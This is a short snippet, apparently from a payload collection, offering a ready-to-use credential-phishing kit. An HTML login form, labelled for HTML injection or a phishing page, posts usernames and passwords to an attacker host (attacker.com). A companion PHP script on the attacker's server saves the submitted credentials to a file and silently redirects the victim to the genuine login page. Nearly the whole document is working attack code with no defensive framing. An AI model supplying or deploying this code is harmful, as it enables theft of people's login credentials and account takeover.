Use as HTML injection or Phishing page
-----------------------------------
```html
<form method=post action="http://www.attacker.com/login.php">
	<p>Username <input type="text" name="username" /></p>
	<p>Password <input type="password" name="password" /></p>
<input type="submit" value="Submit" name="submit" >
</form>
```


On the attackers server ( php -S xxx.xxx.xxx.xxx:80 )
--------------------------------------------------------------
```php
<?php
if(isset($_POST['submit']))
	{
		$myFile = "./creds.txt";
		$fh = fopen($myFile, 'a') or die("can't open file");
		$stringData = "username: " . $_POST['username'] . "\n";
		fwrite($fh, $stringData);
		$stringData = "password: " . $_POST['password'] . "\n";
		fwrite($fh, $stringData);
		fclose($fh);
	} ?>

<script>location.href='http://www.victims-site.com/login-page-original-page'</script>;
```
